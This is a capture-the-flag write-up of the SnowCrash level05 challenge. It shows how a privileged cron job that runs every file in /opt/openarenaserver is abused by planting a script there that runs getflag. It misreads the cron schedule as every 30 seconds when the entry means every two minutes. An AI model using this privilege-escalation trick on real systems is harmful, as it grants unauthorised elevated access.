# Snowcrash05

There's nothing in our home, but we're informed that we have mail

```sh
level05 password:
You have new mail.
level05:~$
```

Huh ? Mail in linux ? https://superuser.com/questions/306163/what-is-the-you-have-new-mail-message-in-linux-unix

Ok so let's open the mail then

```sh
~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

~$ ls -l /usr/sbin/openarenaserver 
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

Ok so the mail is a cron command, there is a script thats being executed every 30 seconds it seems by a flag process.

Here is the target script
```sh
#!/bin/sh
for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

So basically it execs all the files in /opt/openarenaserver/ and then deletes them should be easy to exploit.



```sh
echo "getflag > /tmp/pass.txt" > /opt/openarenaserver/test.sh ; while :; do cat /tmp/pass.txt 2> /dev/null ; done
```

We have to wait a bit for the server to exec the file, but here it is